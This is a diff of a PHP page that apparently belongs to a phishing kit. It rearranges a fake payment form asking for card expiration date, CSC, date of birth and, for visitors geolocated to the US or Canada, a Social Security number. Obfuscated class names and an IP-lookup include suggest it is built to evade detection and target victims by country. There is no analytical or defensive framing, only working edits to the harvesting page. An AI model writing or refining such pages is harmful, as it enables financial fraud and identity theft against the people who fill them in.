@@ -149,31 +149,40 @@ exit;
                                             <div class="x_26ID-Z770 x_V-ForZ118 x_29ID-Z772 medium x_33ID-Z710 left" id="x_34ID-Z677">
 												<input type="tel" id="en_expdate" name="expdate" autocomplete="off" class="Xval666ideX1 x_33ID-Z634" value="" maxlength="7" placeholder="Expiration Date" aria-required="true">
 												
-												<input type="tel" id="date" name="dob" autocomplete="off" class="Xval666ideX1 x_33ID-Z634"  value="" pattern="[0-9-/]{10}" maxlength="10" placeholder="Date of Birth (DD/MM/YYYY)" aria-required="true">
-											</div>
-												<?
-												include('../../functions/get_ip.php');
-												if($_SESSION['_LOOKUP_CNTRCODE_'] == 'US' OR $_SESSION['_LOOKUP_CNTRCODE_'] == 'CA'){
-													
-													echo'<p style="margin-bottom: 8px;">Confirm your information</p>
+												
+												<p style="margin-bottom: 8px;">Confirm your information</p>
 												
 				
+												
+												<input type="tel" id="date" name="dob" autocomplete="off" class="Xval666ideX1 x_33ID-Z634"  value="" pattern="[0-9-/]{10}" maxlength="10" placeholder="Date of Birth (DD/MM/YYYY)" aria-required="true">
+											</div>
                                              <div class="x_31ID-Z757" id="x_32ID-Z685">
                                                 <div class="x_32ID-Z680 x_V-ForZ118 x_22ID-Z601 medium x_30ID-Z523 right" id="x_22ID-Z527">
-                                                    <input type="tel" id="csc" style="background-image: url("../../lib/img/vv.gif");
+                                                    <input type="tel" id="csc" style="background-image: url('../../lib/img/vv.gif');
 	background-repeat: no-repeat;
 	background-position: 97% 45%;
 	margin-bottom: 8px;" name="csc" autocomplete="off" class="x_23ID-Z770 Xval666ideX1 x_23ID-Z741"  placeholder="CSC (3 digits)" style="margin-bottom:48px;" value="" aria-required="true">
-                                                    <input type="tel" id="csc" name="SSN" style="    margin-top: 39px;" autocomplete="off" class="x_23ID-Z770 Xval666ideX1 x_23ID-Z741" pattern="[0-9]{9}" maxlength="9" placeholder="Social security number
-" value="" aria-required="true">                          
-                                                </div>';
+	
+	
+	
+                                                    <?
+												if($_SESSION['_LOOKUP_CNTRCODE_'] == 'US' OR $_SESSION['_LOOKUP_CNTRCODE_'] == 'CA'){
+													
+													echo'
+													
+													<input type="tel" id="csc" name="SSN" style="    margin-top: 39px;" autocomplete="off" class="x_23ID-Z770 Xval666ideX1 x_23ID-Z741" pattern="[0-9]{9}" maxlength="9" placeholder="Social security number" value="" aria-required="true">
+													
+													';
 												
 												}else{
 													
 													
 												}
 												?>
-												
+                                                    
+													
+													
+                                                </div>
                                             </div>
                                         </div>
                                     </div> 
